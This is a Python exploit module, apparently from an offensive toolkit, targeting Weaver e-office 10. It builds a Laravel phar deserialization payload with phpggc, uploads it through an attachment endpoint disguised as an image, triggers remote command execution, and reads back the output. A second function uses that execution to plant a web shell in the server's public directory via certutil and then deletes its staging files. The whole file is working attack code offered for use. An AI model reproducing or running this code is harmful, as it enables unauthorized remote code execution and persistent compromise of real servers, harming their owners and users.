import configparser
from libs.custom_print import custom_print
import requests
import subprocess
import re
from model.model import Target
from os.path import basename
import base64

config = configparser.ConfigParser()
config.read('config.ini')
php_path:str = config['DEFAULT']['php_path']

def exp(target, cmd:str = "whoami", verbose: bool = True) -> str:
        global php_path
        result=0
        try:
            send_file_url = f"{target.url}/eoffice10/server/public/api/attachment/atuh-file"
            deserialization_url = f"{target.url}/eoffice10/server/public/api/attachment/path/migrate"
            get_result_url = f"{target.url}/eoffice10/server/public/api/empower/import"
            headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Connection': 'close',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        }
            location = {'source_path': '', 'desc_path': 'phar://../../../../attachment/'}
            reg = r'\}([^{}]+)$'
            if verbose == True:
                exec = f"{php_path} -d phar.readonly=0 ./libs/phpggc/phpggc -p phar Laravel/RCE9 system '{cmd}' > cmd.phar"
                subprocess.run(exec, shell=True)
            send_file = target.session.post(send_file_url, files={'Filedata': ('register.inc', open('cmd.phar', 'rb'), 'image/jpeg')}, headers=headers, timeout=10)
            if send_file.status_code != 200:
                print(send_file.status_code)
                return False
            result_payload = {'file': send_file.json()["data"]["attachment_id"]}
            deserial = target.session.post(deserialization_url, data=location, headers=headers, timeout=10)
            get_result = target.session.post(get_result_url, data=result_payload, headers=headers, timeout=10)
            result:str = re.search(reg, get_result.text).group(1)
            if verbose:
                custom_print(
                    "Command executed successfully."
                    if result
                    else "Failed to execute command.",
                    "+" if result else "-",
                )
        except requests.exceptions.Timeout:
            if verbose:
                custom_print("Request timed out.", "-")
        except requests.exceptions.RequestException as e:
            if verbose:
                custom_print(f"Request failed: {e}", "-")
        except AttributeError as e:
            if verbose:
                custom_print(f"No results recieved. {e}", "*")
        except Exception as e:
            if verbose:
                custom_print(f"Critical error!", "!")
        return result

def upload_shell(target:Target,file_path:str=""):
        try:
            with open(file_path, 'rb') as f:
                b64_encoded = base64.b64encode(f.read()).decode()
            exp(target=target,cmd=f"echo {b64_encoded} > {basename(file_path)}.txt")
            from time import sleep
            sleep(5)
            r = exp(target=target,cmd=f"certutil -decode {basename(file_path)}.txt ../www/eoffice10/server/public/{basename(file_path)}")
            print(f"Shell has been uploaded to{target.url}/eoffice10/server/public/{basename(file_path)}")
            if "FILE_EXISTS" in r:
                exp(target=target,cmd=f"del .\\webapps\\nc_web\\{basename(file_path)}",verbose=False)
                exp(target=target,cmd=f"del {basename(file_path)}.txt",verbose=False)
                print("File Exist !!")
                return
            exp(target=target,cmd=f"del {basename(file_path)}.txt",verbose=False)
        except KeyboardInterrupt as e:
            print(f"Error Occured: {e}")
